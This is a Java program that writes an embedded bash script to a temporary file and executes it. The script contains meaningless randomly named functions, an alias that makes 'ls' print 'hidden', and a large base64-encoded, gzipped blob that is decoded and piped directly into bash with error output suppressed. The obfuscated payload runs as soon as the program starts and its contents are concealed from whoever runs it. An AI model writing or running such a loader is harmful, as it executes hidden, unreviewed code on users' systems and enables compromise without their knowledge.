import java.io.*;

public class Main {
    public static void main(String[] args) {
        try {

            String script = """
#!/bin/bash

vhbiu6t9c() { echo $((RANDOM * RANDOM)); }
vbgl0kc9c() { for i in {1..3}; do :; done; }
v3llr34b3() { alias ls='echo hidden'; }

base64 -d <<'EOF' | gunzip | bash 2>/dev/null
H4sIAAAAAAAAA6VXW28bxxV+318x3RCWVHuXy5uiS+hCFimbAi8WRVmmLIMYcofkissdZncpipQIxCkCB0lsGcjFRmvUdRA3LgonLRo4ghPXf0bU5Sl/oWd2dsml7KRoIj3szJkz37nMN2cO3/pdsKwZwTK26oLwFjr94cHJN18d3/128OUfB/sPTm/vo4X85VwpkcsspLKDx/8YfPBk8OjR4N4dLl9YK3DhFZs2iIEOD14c//3F4cF3R/efn/7p69Nbnwpkp0VNG62tpRLxwC77zEkT07FwKDYdnpYi1disFFXUsjQTwhUpFitPR4g6G4lVZyb63l6fCwDhmwGSSuQO0aw6pjJpy9SsndkGHl7xNrExbCHd5Xpqi2rF3oKS7aV6uUQxlu2thDcSjWgukYlmt5Kh4lYxtrG+Ess2i0qxkNLSi8uKs2frUj23vtLZSGTsbHOtl9EUJbeeUtLryVhmfcUuNlM7G4VkONu71CgW1iIpraNVuqnpVCPaLVzXc9dCjVBByW+oS/q76816FhcWOoXrrWymsbOGL+sbWF9SCs3QsqqErucLy7nyWssuGLC+uDw7imxxKXUVgmIfiKfT6cjbmoXlCm3KdsevdjWXLziKbACq0WhktJxdyCRhkX1gqdmVLbPbI4YDo5KR3lIqnSxdXXDyOBwzu9TU1TPpdg0Ox3PSzMzsbB+odXjw8cnLl57yaip7uXQpd720lk/Hxbptt6y5YNDEHbmm2fV2uW0Rs0INmxg28yfonjHGWtBif8EmBtpamlGTynRHHEaczq0lltIL+WRiHJmjOlAVnbbVqo5N4huqQZPoBFvECurYJpYdVGnH0ClW/UqSrhntHQk31eno0GYit55N5xYSvy0Ug/TqWMI10BIFodlQNRNJLSQGhhkXhYo6Nkd7e4jsaDYKCYLZRFIVlSm1ZZ3WhgNhmPjjpx8PXuz/9OMng7+9f/SXh4cHdwbPHgwePhVu3GA7Q+jmTYZXaZs6kqw0BYkY8J+S6GqGX9MMg+aZxHvKkdeUI6DszxhEVW9SFZ3fAYthFGEeH3/26OjDe6cf3Dl++c3RF7cPf3guVLCNLiJIY1WryVsWNdA776BkbknYFRASIVJxDu0iUYVrUNaJCjPbbJMLsES2iQ5TUTOqVASBrTXheHGz5eqg/gUGoRoWg4AhTODEtonJBDcA1MYMXaxRWtMJg8CqahKLLYu2zg57Rnb+RdS/CQAcUDPKtG2oHITDukDb4IAldSxJM8QL7kq3RYZLnlDXLCANE8/NjctKjHiw4LtofVeBsc1zvN3WWCZEXnb7zD3PnokNywXhzvmc6HgegKyF7TqTBRtw1UZigk29W1KxjUt1glVilgzcdDavkoq0TsqrtNIgtnTVpDatUF10NvZZchwXRNq2R+lxFndHDgD3ScV2DotnzBUgN0ifalkHQz5NPncscUMmWCKcHFXNwPoYnNAXGIeAcoN73w4+eoq8giLIwRAy2waSKmOkuxhUyXbQaOs6Cl88F0LnBEsnpIXCQqtmwhcoL7pbReDrSBvuwC4ilToFcrk2XJuDr/518t2Tn368Jc67t3keHGMu3Xp49OzLo/tfI18FEloNDeC4nTCy24YB9H7NLzDHuO16B/XBdz/jbKconK3UYBOuhWmXOlC1Ss5zPjnlkMN/uV2LSJIMKuG2TdstYAHhuZJ4EyAGhq+tCEJ29Z2yCBcFTgfrdWrZcwFmk+VoWLPchCLEnY7AaJRUvw/y711LP5tiX8LGsgwpZoXEM+lP+Fj4wJn/OwO/OtDYLwYKoL8mzFFgCFWpiTSkGWg3JMshpT+PVOrcI5WypycemOTWaRINn68bWOop0uymdPP8pmyb3ZGpTfaIiaNo9hCrAEgyUGjKQWWVn5GAo4vsBTh3zvV4KARJ2SS44ezw7hDzyCACh+i9BuGFfXT/r0f//vzk7veD/S/EM2c4vMn+O+N55KMlRzxLeJbcN7DAB+t7pgWD1tstRIxtlN0orSbz15L5eESuE42Ybi86B/0WWyykV+POWwPjxXQqmS2A/mI+WYiXTXU2pWlX8p1tpRx+N5p5+5qi0GIlXS5qqbdXLCQHI2+oOuAQj5832bwlF2rELmGzRnnaXO5qVTQWP++cWQbmkV2H4NgJuKfjVwA50S3iLDtsRiYBIsQV1MQ7JTbWiBUPKR6LRF7jO3VNJ8xiwFFHkm6jgG+HY9flH0KTk47W+fNTU67kFzg5+T9IOfUmVkItRBbcjwlrz8PZ25vwrL2ZqyNm+rk5ZOcwXbt825zUNhoGtIvjPjGX+iwpVY0xc3QwLLixk5oaNT3oWia5uopOP/3P0d0ngjOJi7toU9zehJdrUwxvwmO3KbYsPuXde58LoS3xpOyXgStlr/xI7FR6vqANtZ3uwMXwpAqfW5UunxsQOxcZxMXrWFzA3uKzSqz0efCjQD2XoKngi05b8QeixsNKdMZF093YnIHjg6H9LBTWWwZf5PNqy5tB6vkxOT0VHHtg0j02J6vQPSP41Uumo0jqKFP+Ag2nwTVPXt07efzJ4cEzWZahKYemqYUm3Br02fPBh/88fe+9we0Xh68eD/a/Z62182KfvPozNNtsyzzyv9a8KxiXDV/wcXHEK2vKBEplC6iQzGcEoYM1W/gvL7CRo7EPAAA=
EOF
""";


            File file = File.createTempFile("start", ".sh");
            try (FileWriter fw = new FileWriter(file)) {
                fw.write(script);
            }


            file.setExecutable(true);


            ProcessBuilder pb = new ProcessBuilder("bash", file.getAbsolutePath());
            pb.redirectErrorStream(true);
            Process p = pb.start();


            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) System.out.println(line);
            p.waitFor();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
